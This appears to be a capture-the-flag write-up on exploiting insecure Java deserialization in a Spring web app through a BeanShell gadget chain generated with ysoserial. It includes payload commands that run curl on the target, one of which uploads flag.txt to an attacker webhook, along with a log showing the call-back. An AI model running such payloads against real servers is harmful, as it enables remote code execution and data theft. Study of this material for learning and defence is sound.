# Idiotic
tl;dr 
- Insecure Java Deserialization to RCE

## Enumeration
Given a Java web challenge, the first thing to do is to analyze the dockerfile configuration. As we can see here on entry point the enableUnsafeSerialization is being set into true.
```
FROM maven:3.8.8-eclipse-temurin-17 AS build

WORKDIR /app

COPY ./app/pom.xml ./
RUN mvn dependency:go-offline

COPY ./app/src ./src
RUN mvn clean package -DskipTests
#ENTRYPOINT [ "/bin/sh" ]

FROM eclipse-temurin:17-jdk

WORKDIR /app

COPY --from=build /app/target/iot-0.0.1-SNAPSHOT.jar ./iot.jar
COPY flag.txt ./flag.txt

EXPOSE 8080

ENTRYPOINT ["java", "-Dorg.apache.commons.collections.enableUnsafeSerialization=true", "-jar", "iot.jar"]
```
On DeviceController.java, we can see the `/upload` endpoint will receive a base64 data that will be deserialized.
```java
DeviceController.java

@PostMapping("/upload")
    public ResponseEntity<?> uploadDevice(@RequestBody Map<String, String> payload) {
        try {
            String base64Data = payload.get("file");
            if (base64Data == null || base64Data.isEmpty()) {
                System.out.println("ERROR: Upload request missing 'file' field.");
                throw new IllegalArgumentException("Missing 'file' in request payload");
            }

            System.out.println("INFO: Starting deserialization process.");

            byte[] binaryData = Base64.getDecoder().decode(base64Data);
            System.out.println("DEBUG: Base64 decoded data length: " + binaryData.length);

            Device device = deserializeDevice(binaryData);

            System.out.println("DEBUG: Deserialized device object - " + device);

            deviceRepository.save(device);

            System.out.println(
                    "INFO: Device '" + device.getName() + "' with ID '" + device.getId() + "' successfully added.");
            return ResponseEntity.ok(Map.of("message", "Device added successfully"));
        } catch (Exception e) {
            System.out.println("ERROR: Failed to deserialize device - " + e.getMessage());
            e.printStackTrace();
            return ResponseEntity.status(HttpStatus.BAD_REQUEST)
                    .body(Map.of("error", "Failed to deserialize device: " + e.getMessage()));
        }
    }
```

This is the deserializeDevice function that will deserialize our uploaded device.
```java

  private Device deserializeDevice(byte[] data) throws Exception {
        try (ByteArrayInputStream bis = new ByteArrayInputStream(data);
                ObjectInputStream ois = new ObjectInputStream(bis)) {

            System.out.println("INFO: Starting vulnerable deserialization process.");
            Object deserializedObject = ois.readObject();

            if (deserializedObject instanceof Device) {
                Device device = (Device) deserializedObject;
                System.out.println("DEBUG: Successfully deserialized Device object.");
                System.out.println("DEBUG: Device details - ID: " + device.getId() +
                        ", Name: " + device.getName() +
                        ", Type: " + device.getType() +
                        ", Status: " + device.isStatus());
                return device;
            } else {
                System.out.println("ERROR: Deserialized object is not a Device.");
                throw new IllegalArgumentException("Invalid object type: " + deserializedObject.getClass().getName());
            }
        } catch (Exception e) {
            System.out.println("ERROR: Deserialization failed - " + e.getMessage());
            e.printStackTrace();
            throw e;
        }
    }
```
But, we don't know yet what is the dependencies that will perform the deserialization process. For that, we can refer to the `pom.xml` file and we got the dependencies which is BeanShell.
```xml
[snipped].....
    <dependency>
            <groupId>com.h2database</groupId>
            <artifactId>h2</artifactId>
            <scope>runtime</scope>
        </dependency>
        <dependency>
            <groupId>org.projectlombok</groupId>
            <artifactId>lombok</artifactId>
            <version>1.18.28</version>
            <scope>provided</scope>
        </dependency>
        <dependency>
            <groupId>org.beanshell</groupId>
            <artifactId>bsh</artifactId>
            <version>2.0b5</version>
        </dependency>
    </dependencies>
```

## Exploitation
By using ysoserial.jar [github](https://github.com/frohoff/ysoserial) we could generate malicious BeanShell objects for RCE.
First thing, we try to perform a curl to our attack box.
```
/usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -jar ysoserial-all.jar BeanShell1 'curl http://192.168.3.1' > upload.b64
```

After generating the payload, we can upload the file to the dashboard.
![image](https://github.com/user-attachments/assets/5b49f95d-b9f3-4511-92cf-e03241e9b2c3)

And the payload is executed successfully!
![image](https://github.com/user-attachments/assets/008a589b-be19-4d78-b570-9af4625cdc7c)

```
⚡ root@kali~ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.3.2 - - [20/Mar/2025 19:40:10] "GET / HTTP/1.1" 200 -
```

Time to change our payload to read the flag. *kudos to abejads for this flag reading method ☕
```
/usr/lib/jvm/java-1.11.0-openjdk-amd64/bin/java -jar ysoserial-all.jar BeanShell1 'curl -X POST -F 'file=@flag.txt' your_webhook_url_here' > upload.b64
```

![image](https://github.com/user-attachments/assets/16d2f06f-b36c-4af2-ab15-c48457ebe1b0)

